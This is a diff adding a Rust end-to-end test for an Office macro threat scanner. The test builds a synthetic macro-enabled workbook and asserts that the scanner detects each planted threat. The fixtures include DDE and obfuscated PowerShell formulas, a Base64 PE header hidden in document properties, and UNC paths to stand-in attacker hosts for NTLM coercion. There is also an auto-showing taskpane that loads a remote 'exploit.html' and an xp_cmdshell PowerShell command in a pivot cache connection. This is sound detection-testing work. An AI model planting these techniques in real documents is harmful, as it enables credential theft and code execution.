@@ -4200,3 +4200,219 @@ fn e2e_glossary_font_ink_and_sequence_threat_inspection() {
         "JSON missing VBA-CELL-037"
     );
 }
+
+#[test]
+fn e2e_docprops_webext_pivot_and_transpose_lookup_threat_inspection() {
+    let content_types = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/docProps/custom.xml" ContentType="application/vnd.openxmlformats-officedocument.custom-properties+xml"/>
+  <Override PartName="/word/taskpanes/taskpane1.xml" ContentType="application/vnd.ms-office.webextensiontaskpanes+xml"/>
+  <Override PartName="/xl/pivotCache/pivotCacheDefinition1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.pivotCacheDefinition+xml"/>
+</Types>"#;
+
+    let root_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom-properties" Target="docProps/custom.xml"/>
+  <Relationship Id="rId3" Type="http://schemas.microsoft.com/office/2020/02/relationships/taskpane" Target="word/taskpanes/taskpane1.xml"/>
+</Relationships>"#;
+
+    let workbook_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let workbook_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/pivotCacheDefinition" Target="pivotCache/pivotCacheDefinition1.xml"/>
+</Relationships>"#;
+
+    let sheet1_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="str">
+        <f>CONCAT(LOOKUP(1, {1, "cmd"; 2, "powershell"}), "|'/c calc'!A0")</f>
+      </c>
+      <c r="B1" t="str">
+        <f>CONCAT(TRANSPOSE({"p", "o", "w", "e", "r", "s", "h", "e", "l", "l"}), " -c calc")</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    // docProps/custom.xml with Base64 PE and remote UNC path (VBA-CELL-038)
+    let custom_props_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
+  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="Payload">
+    <vt:lpwstr>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGU=</vt:lpwstr>
+  </property>
+  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="Coercion">
+    <vt:lpwstr>\\attacker.internal\share\leak</vt:lpwstr>
+  </property>
+</Properties>"#;
+
+    // word/taskpanes/taskpane1.xml with canAutoShow="1" (VBA-CELL-039)
+    let taskpane_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<wetp:taskpanes xmlns:wetp="http://schemas.microsoft.com/office/taskpanes/2010/main">
+  <wetp:taskpane canAutoShow="1">
+    <wetp:webextensionref id="ext1"/>
+  </wetp:taskpane>
+</wetp:taskpanes>"#;
+
+    let taskpane_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2020/02/relationships/webextension" Target="http://malicious.cdn.example.com/exploit.html" TargetMode="External"/>
+</Relationships>"#;
+
+    // xl/pivotCache/pivotCacheDefinition1.xml with xp_cmdshell and UNC connection (VBA-CELL-040)
+    let pivot_cache_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<pivotCacheDefinition xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" r:id="rId1" connection="OLEDB;Provider=SQLOLEDB;Data Source=\\sqlserver\db;Initial Catalog=master;EXEC xp_cmdshell('powershell -enc ...')">
+</pivotCacheDefinition>"#;
+
+    let pivot_cache_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/pivotCacheRecords" Target="\\attacker.relay\ntlm" TargetMode="External"/>
+</Relationships>"#;
+
+    let project_bytes = synthesize_cfb_project(
+        "VBAProject",
+        &[("Module1", "Sub AutoOpen()\nEnd Sub\n", &[])],
+        &[],
+    );
+
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", content_types),
+        ("_rels/.rels", root_rels),
+        ("xl/workbook.xml", workbook_xml),
+        ("xl/_rels/workbook.xml.rels", workbook_rels),
+        ("xl/worksheets/sheet1.xml", sheet1_xml),
+        ("docProps/custom.xml", custom_props_xml),
+        ("word/taskpanes/taskpane1.xml", taskpane_xml),
+        ("word/taskpanes/_rels/taskpane1.xml.rels", taskpane_rels),
+        ("xl/pivotCache/pivotCacheDefinition1.xml", pivot_cache_xml),
+        (
+            "xl/pivotCache/_rels/pivotCacheDefinition1.xml.rels",
+            pivot_cache_rels,
+        ),
+        ("xl/vbaProject.bin", &project_bytes),
+    ];
+
+    let zip_bytes = synthesize_zip(&entries);
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify DocumentPropertyPayloadSmuggling (VBA-CELL-038)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "DocumentPropertyPayloadSmuggling"
+                && t.coordinate.contains("docProps:base64PePayload")
+                && t.severity == "Critical"),
+        "Should detect Base64 PE binary in custom document property: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "DocumentPropertyPayloadSmuggling"
+                && t.coordinate.contains("docProps:uncCoercion")
+                && t.severity == "High"),
+        "Should detect external UNC path in custom document property: {threats:?}"
+    );
+
+    // 2. Verify WebExtensionOrTaskpaneAnomaly (VBA-CELL-039)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WebExtensionOrTaskpaneAnomaly"
+                && t.coordinate.contains("taskpane:autoShowTrigger")
+                && t.severity == "Critical"),
+        "Should detect auto-show trigger in Office taskpane: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WebExtensionOrTaskpaneAnomaly"
+                && t.coordinate.contains("webext:remoteTarget")
+                && t.severity == "High"),
+        "Should detect external web target in taskpane relationship: {threats:?}"
+    );
+
+    // 3. Verify PivotCacheDataConnectionAnomaly (VBA-CELL-040)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PivotCacheDataConnectionAnomaly"
+                && t.coordinate.contains("pivotCache:commandExecution")
+                && t.severity == "Critical"),
+        "Should detect database shell command execution in PivotCache connection: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PivotCacheDataConnectionAnomaly"
+                && t.coordinate.contains("pivotCache:uncPath")
+                && t.severity == "High"),
+        "Should detect remote UNC path in PivotCache relationship: {threats:?}"
+    );
+
+    // 4. Verify Formula De-obfuscation via LOOKUP and TRANSPOSE
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd|'/c calc'!A0")),
+        "Cell A1 should resolve DDE through LOOKUP evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell -c calc")),
+        "Cell B1 should resolve powershell LOLBin threat through TRANSPOSE evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-038, VBA-CELL-039, VBA-CELL-040
+    let sarif = inspection_to_sarif(&inspection, "file:///test/docprops_webext_pivot.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-038"),
+        "SARIF must contain VBA-CELL-038 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-039"),
+        "SARIF must contain VBA-CELL-039 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-040"),
+        "SARIF must contain VBA-CELL-040 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-038, VBA-CELL-039, VBA-CELL-040
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-038\""),
+        "JSON missing VBA-CELL-038"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-039\""),
+        "JSON missing VBA-CELL-039"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-040\""),
+        "JSON missing VBA-CELL-040"
+    );
+}
